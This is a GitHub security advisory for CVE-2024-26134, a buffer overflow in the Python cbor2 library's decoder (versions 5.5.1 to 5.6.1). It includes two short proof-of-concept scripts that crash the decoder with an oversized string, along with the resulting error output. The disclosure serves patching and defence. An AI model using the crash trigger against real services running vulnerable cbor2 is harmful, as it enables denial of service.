# [H] Potential buffer overflow in CBOR2 decoder

## Summary
Severity: High
Advisory: GHSA-375g-39jq-vq7m
CVE: CVE-2024-26134
CWE: CWE-120
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-02-21
Source: https://github.com/advisories/GHSA-375g-39jq-vq7m
Type: github-advisory

## Affected
- PyPI: `cbor2` — affected >=5.5.1 <5.6.2

## Details
### Summary
Ever since https://github.com/agronholm/cbor2/pull/204 (or specifically https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542) was merged, I can create a reproducible crash when running the snippet under PoC on a current Debian bullseye aarm64 on a Raspberry Pi 3 (I was **not** able to reproduce this on my x86_64 Laptop with Python 3.11; I suspect because there is enough memory to allocate still)

## Details


### PoC
```py
import json
import concurrent.futures
import cbor2

def test():
    obj = "x" * 131128
    cbor_enc = cbor2.dumps(obj)
    return cbor2.loads(cbor_enc)

with concurrent.futures.ProcessPoolExecutor() as executor:
    future = executor.submit(test)
    print(future.result())
```

```
malloc(): unsorted double linked list corrupted
Traceback (most recent call last):
  File "test.py", line 14, in <module>
    print(future.result())
  File "/usr/lib/python3.9/concurrent/futures/_base.py", line 440, in result
    return self.__get_result()
  File "/usr/lib/python3.9/concurrent/futures/_base.py", line 389, in __get_result
    raise self._exception
concurrent.futures.process.BrokenProcessPool: A process in the process pool was terminated abruptly while the future was running or pending.
```

If one calls it without the indirection via the pool executor, a SystemError is shown that hides the buffer overflow.

```py
import json
import cbor2

def test():
    obj = "x" * 131128
    cbor_enc = cbor2.dumps(obj)
    return cbor2.loads(cbor_enc)

print(test())
```

```
Traceback (most recent call last):
  File "test.py", line 12, in <module>
    print(test())
  File "test.py", line 9, in test
    return cbor2.loads(cbor_enc)
SystemError: <built-in function loads> returned NULL without setting an error
```

### Impact
An attacker can crash a service using cbor2 to parse a CBOR binary by sending a long enough object.

## References
- https://github.com/agronholm/cbor2/security/advisories/GHSA-375g-39jq-vq7m
- https://nvd.nist.gov/vuln/detail/CVE-2024-26134
- https://github.com/agronholm/cbor2/pull/204
- https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542
- https://github.com/agronholm/cbor2/commit/4de6991ba29bf2290d7b9d83525eda7d021873df
- https://github.com/agronholm/cbor2
- https://github.com/agronholm/cbor2/releases/tag/5.6.2
- https://github.com/pypa/advisory-database/tree/main/vulns/cbor2/PYSEC-2024-155.yaml
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BT42VXZMMMCSSHMA65KKPOZCXJEYHNR5
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/GX524ZG2XJWFV37UQKQ4LWIH4UICSGEQ
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PWC3VU6YV6EXKCSX5GTKWLBZIDIJNQJY
